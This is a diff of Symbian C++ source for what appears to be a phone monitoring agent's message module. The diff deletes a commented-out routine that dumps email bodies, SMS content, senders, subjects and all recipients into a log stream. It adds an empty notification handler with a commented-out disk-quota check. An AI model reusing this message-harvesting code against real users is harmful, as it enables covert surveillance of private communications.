@@ -298,98 +298,36 @@ void CAgentMessages::StopAgentCmdL()
 	//CloseLogL();    // TODO: verify this              
 	}
 
-/*
-void CAgentMessages::AddStoreToStreamL(RWriteStream& strm, const TMsvId& msvId, TMAPISerializedMessageHeader& aSerializedMsg )
+void CAgentMessages::NotifyAgentCmdL(TUint32 aData)
 	{
-	CMsvEntry* entry = iMsvSession->GetEntryL(msvId);
-	CleanupStack::PushL(entry);
-
-	// In order to retrieve the E-Mail body the Entry Store must be close... or it will raise an MSGS 259 Panic
-	// So we process first the E-Mail body
-	if (entry->Entry().iMtm == KUidMsgTypePOP3 || entry->Entry().iMtm == KUidMsgTypeSMTP || entry->Entry().iMtm
-			== KUidMsgTypeIMAP4)
-		{
-		// Dump eMail Body
-		CImEmailMessage* mailMsg = CImEmailMessage::NewLC(*entry);
-		mailMsg->GetBodyTextL(msvId, CImEmailMessage::EThisMessageOnly, *iRichText, *iParaFormatLayer, *iCharFormatLayer);
-		HBufC16* buf = iRichText->Read(0).AllocLC();
-		strm << (*buf);
-		CleanupStack::PopAndDestroy(buf);
-		CleanupStack::PopAndDestroy(mailMsg);
-		}	
-	
-	if (entry->HasStoreL())
-		{
-		CMsvStore *store = entry->ReadStoreL();
-		CleanupStack::PushL(store);
-
-		// Dumps the "Generic Store" informations
-		if (store->HasBodyTextL())
-			{
-			store->RestoreBodyTextL(*iRichText);
-
-			// Extracts body store as a "Raw" byte array
-			HBufC16* buf = iRichText->Read(0).AllocLC();
-			strm << (*buf);
-			CleanupStack::PopAndDestroy(buf);
-			}
-
-		if (entry->Entry().iMtm == KUidMsgTypeSMS)
-			{
-			// This is a SMS  // jo
-			aSerializedMsg.iNumAttachs = 0;
-			
-			
-			// Retrieve the SMS header and saves all the informations to the stream
-			CSmsHeader* smsHeader = CSmsHeader::NewL(CSmsPDU::ESmsSubmit, *iRichText);
-			CleanupStack::PushL(smsHeader);
-			smsHeader->RestoreL(*store);
-			strm << (smsHeader->Message());
-			CleanupStack::PopAndDestroy(smsHeader);
-			}
-
-		if (entry->Entry().iMtm == KUidMsgTypeMultimedia)
-			{
-			// TODO: this header is not available... 
-			// #include <MMSHEADERS.h>
-			//   CMmsSettings* mmsSettings = CMmsSettings::NewL();
-			//   mmsSettings->LoadSettingsL();
-			// 
-			//   CMmsHeaders* mmsHeaders = CMmsHeaders::NewL( mmsSettings->MmsVersion() );
-			//   mmsHeaders->RestoreL(*store);
-			//   strm << (mmsHeaders->Message());
-			//
-			}
-
-		if (entry->Entry().iMtm == KUidMsgTypePOP3 || entry->Entry().iMtm == KUidMsgTypeSMTP || entry->Entry().iMtm
-				== KUidMsgTypeIMAP4)
-			{
-			// Retrieve the Email header and saves all the informations to the stream
-			CImHeader* mailHeader = CImHeader::NewLC();
-			mailHeader->RestoreL(*store);
-			strm << (mailHeader->From());
-			strm << (mailHeader->InReplyTo());
-			strm << (mailHeader->Subject());
-			strm << (mailHeader->ReplyTo());
-			for (TInt i = 0; i < mailHeader->ToRecipients().Count(); i++)
+	//NB: if you want to implement freespace quota check:
+			//1. uncomment this
+			//2. add code for checking iBelowFreespaceQuota before writing log
+			//3. pay attention to timestamps into markup file
+			/*
+			TInt notifyType = aData & 0x000000ff;
+			switch(notifyType)
 				{
-				strm << (mailHeader->ToRecipients()[i]);
+				case ENotifyThreshold:
+					{
+					TInt value = (aData & 0x0000ff00) >> 8;
+					if (value == EBelow)
+						{
+						iBelowFreespaceQuota = ETrue;
+						}
+					else
+						{
+						iBelowFreespaceQuota = EFalse;
+						}
+					}
+					break;
+				default:
+					break;
 				}
-			for (TInt i = 0; i < mailHeader->CcRecipients().Count(); i++)
-				{
-				strm << (mailHeader->CcRecipients()[i]);
-				}
-			for (TInt i = 0; i < mailHeader->BccRecipients().Count(); i++)
-				{
-				strm << (mailHeader->BccRecipients()[i]);
-				}
-			CleanupStack::PopAndDestroy(mailHeader);
-			}
-		CleanupStack::PopAndDestroy(store);
-		}
-	CleanupStack::PopAndDestroy(entry);
+				*/
 	}
-*/
+
+
 
 HBufC8* CAgentMessages::GetSMSBufferL(TMsvEntry& aMsvEntryIdx, const TMsvId& aMsvId)
 {
